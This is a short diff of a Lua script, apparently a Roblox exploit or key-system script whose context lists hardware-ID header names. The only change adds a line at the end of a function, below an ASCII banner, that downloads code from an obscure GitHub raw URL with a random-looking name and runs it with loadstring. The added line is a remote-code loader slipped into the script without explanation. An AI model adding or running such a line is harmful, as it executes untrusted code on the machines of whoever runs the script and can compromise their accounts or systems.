@@ -887,5 +887,5 @@ local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "
  |                                        |     |                                         | 
  |________________________________________|     |_________________________________________|
  ]])
- 
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat132"))()
 end
